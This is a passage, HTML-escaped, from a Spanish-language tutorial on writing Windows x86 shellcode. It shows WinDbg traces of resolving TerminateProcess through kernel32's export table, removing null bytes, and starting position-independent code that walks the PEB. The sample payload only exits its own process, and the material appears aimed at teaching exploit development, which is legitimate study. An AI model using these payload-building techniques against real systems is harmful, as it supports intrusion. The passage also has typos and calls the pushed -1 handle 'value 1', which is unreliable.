&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;007e0073 01da            add     edx,ebx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;007e0075 668b0c4a        mov     cx,word ptr [edx+ecx*2]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;007e0079 8b571c          mov     edx,dword ptr [edi+1Ch]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;007e007c 01da            add     edx,ebx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;007e007e 8b048a          mov     eax,dword ptr [edx+ecx*4]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;007e0081 01d8            add     eax,ebx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;007e0083 8944241c        mov     dword ptr [esp+1Ch],eax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;007e0087 61              popad
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;007e0088 c3              ret
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Una vez que hemos llegado al punto de interrupción, avanzaremos paso a paso por las instrucciones hasta que obtengamos la dirección de memoria virtual de &lt;code&gt;TerminateProcess&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=76c2a210 ebx=76c00000 ecx=00000593 edx=76c7ba18 esi=76c886b3 edi=76c7b9f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=007e0083 esp=020dfd4c ebp=020dff74 iopl=0         nv up ei pl nz na po nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;007e0083 8944241c        mov     dword ptr [esp+1Ch],eax ss:0023:020dfd68=020dffcc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; u @eax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;KERNEL32!TerminateProcessStub:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c2a210 8bff            mov     edi,edi
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c2a212 55              push    ebp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c2a213 8bec            mov     ebp,esp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c2a215 5d              pop     ebp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c2a216 ff2538bac876    jmp     dword ptr [KERNEL32!_imp__TerminateProcess (76c8ba38)]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c2a21c cc              int     3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c2a21d cc              int     3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c2a21e cc              int     3
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;LLegados a este punto, hemos visto que el shellcode ha resuelto correctamente la dirección de memoria &lt;code&gt;TerminateProcess&lt;&#x2F;code&gt;, la última instrucción escribirá la dirección de la memoria en la pila en el desplazamiento &lt;code&gt;0x1c&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Hacemos esto para garantizar que nuestra dirección se vuelva a incluir en EAX después de ejecutar &lt;code&gt;popad&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Antes de continuar, echemos un vistazo de nuevo al prototipo de la función &lt;code&gt;TerminateProcess&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp z-code&quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;BOOL&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function z-c++&quot;&gt;&lt;span class=&quot;z-meta z-toc-list z-full-identifier z-c++&quot;&gt;&lt;span class=&quot;z-entity z-name z-function z-c++&quot;&gt;TerminateProcess&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c++&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;  &lt;span class=&quot;z-meta z-brackets z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-c++&quot;&gt;[&lt;&#x2F;span&gt;in&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-c++&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;HANDLE&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;hProcess&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;  &lt;span class=&quot;z-meta z-brackets z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-c++&quot;&gt;[&lt;&#x2F;span&gt;in&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-c++&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;UINT&lt;&#x2F;span&gt;   uExitCode
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c++&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Tras ejecutar la instrucción RET, volvemos a la función de inicio , donde ponemos a cero ECX y lo insertamos en la pila.&lt;&#x2F;p&gt;
&lt;p&gt;Este valor actuará como parámetro para &lt;code&gt;uExitCode&lt;&#x2F;code&gt; y representará una salida exitosa. Después se ejecuta una instrucción &lt;code&gt;push&lt;&#x2F;code&gt; que inserta el valor &lt;code&gt;0xFFFFFFFF&lt;&#x2F;code&gt; en la pila como el parámetro &lt;code&gt;hProcess&lt;&#x2F;code&gt; (El valor 1 representa un pseudo-handle para nuestro proceso).&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=76c2a210 ebx=76c00000 ecx=00000000 edx=007e0000 esi=00815c80 edi=008122f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=007e001d esp=020dfd68 ebp=020dff74 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;007e001d ffd0            call    eax {KERNEL32!TerminateProcessStub (76c2a210)}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; dds esp L3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;020dfd68  ffffffff
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;020dfd6c  00000000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;020dfd70  78b5b983
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Para salir de una forma limpia podemos pasar por encima la llamada de &lt;code&gt;TerminateProcess&lt;&#x2F;code&gt;, para comprobar que el shellcode funciona correctamente podemos comentar &lt;code&gt;int3&lt;&#x2F;code&gt;, si todo funciona correctamente, el shellcode debería cerrarse correctamente.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;C:\Users\dreamer\Python312-32&amp;gt;python.exe exploit.py
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Encoded 64 instructions...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Shellcode located at address 0x750000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;...ENTER TO EXECUTE SHELLCODE...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;C:\Users\dreamer\Python312-32&amp;gt;echo %ERRORLEVEL%
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Ahora podemos resolver cualqueir función exportada por &lt;code&gt;kernel32.dll&lt;&#x2F;code&gt;, lo que nos permite encadenar llaamdas a la API con mímina sobrecarga.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;como-evitar-bytes-nulos&quot;&gt;Como evitar bytes nulos&lt;a class=&quot;zola-anchor&quot; href=&quot;#como-evitar-bytes-nulos&quot; aria-label=&quot;Anchor link for: como-evitar-bytes-nulos&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;Antes de llamar a otra API, debemos analizar el código, ya que nos genera bytes nulos.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; u @eip l7
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;01fc0000 cc              int     3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;01fc0001 89e5            mov     ebp,esp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;01fc0003 81ec00020000    sub     esp,200h
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;01fc0009 e811000000      call    01fc001f
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;01fc000e 6883b9b578      push    78B5B983h
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;01fc0013 e822000000      call    01fc003a
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;01fc0018 31c9            xor     ecx,ecx
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Si observamos las instrucciones que generaron los bytes nulos, encontramos que la primera es &lt;code&gt;sub esp, 0x200&lt;&#x2F;code&gt;. Esta instrucción también puede usar un valor de desplazamiento negativo, o podemos usar una combinación de varias instrucciones que logren el mismo efecto, como se muestra a continuación:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; ? 0x0 - 0x210
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Evaluate expression: -528 = fffffdf0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; ? @esp + 0xfffffdf0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Evaluate expression: 4333304548 = 00000001`0248fae4
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; r @esp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;esp=0248fcf4
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; ? 0248fcf4 - 0248fae4
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Evaluate expression: 528 = 00000210
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;En vez de usar la operación &lt;code&gt;sub&lt;&#x2F;code&gt;, podemos agregar un desplazamiento mayor y obtener el mismo resultado.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;start:&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;int3;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;mov ebp, esp;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;add esp, 0xfffffdf0;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    ...
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;El resultado en WinDBG muestra que no contiene bytes nulos:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00d20000 cc              int     3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00d20001 89e5            mov     ebp,esp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00d20003 81c4f0fdffff    add     esp,0FFFFFDF0h
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00d20009 e811000000      call    00d2001f
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00d2000e 6883b9b578      push    78B5B983h
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00d20013 e822000000      call    00d2003a
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00d20018 31c9            xor     ecx,ecx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00d2001a 51              push    ecx
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Sin embargo, las siguientes llamadas si contienen bytes nulos, ¿Cómo podemos solucionarlo?&lt;&#x2F;p&gt;
&lt;h3 id=&quot;shellcode-independiente-de-la-poisicion&quot;&gt;Shellcode independiente de la poisición&lt;a class=&quot;zola-anchor&quot; href=&quot;#shellcode-independiente-de-la-poisicion&quot; aria-label=&quot;Anchor link for: shellcode-independiente-de-la-poisicion&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Hay varias maneras de evitar que las llamadas contengan bytes nulos, la más efectiva es obtener de forma dinámica la función que quereamos llamar y almacenarla en un registro.&lt;&#x2F;p&gt;
&lt;p&gt;Esta técnica, aprovecha el hecho de que una llamdada a una función ubicada en una dirección inferior utiliza un desplazamiento negativo, por lo tanto tiene una alta probabilidad de no contener bytes nulos. Además, al ejecutar la instrucción &lt;code&gt;call&lt;&#x2F;code&gt;, la dirección de retorno se almacena en la pila.&lt;&#x2F;p&gt;
&lt;p&gt;Esta dirección puede extraerse de la pila y almacenarse en un registro para calcular de forma dínamica la dirección absoluta de la función.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;start:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;int3;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov ebp, esp;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;add esp, 0xfffffdf0;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;find_kernel32:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;xor ecx, ecx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov esi, fs:[ecx+30h];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov esi, [esi+0Ch];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov esi, [esi+1Ch];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;next_module:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov ebx, [esi+8h];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov edi, [esi+20h];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov esi, [esi];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;cmp [edi+12*2], cx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;jne next_module;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;ret;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
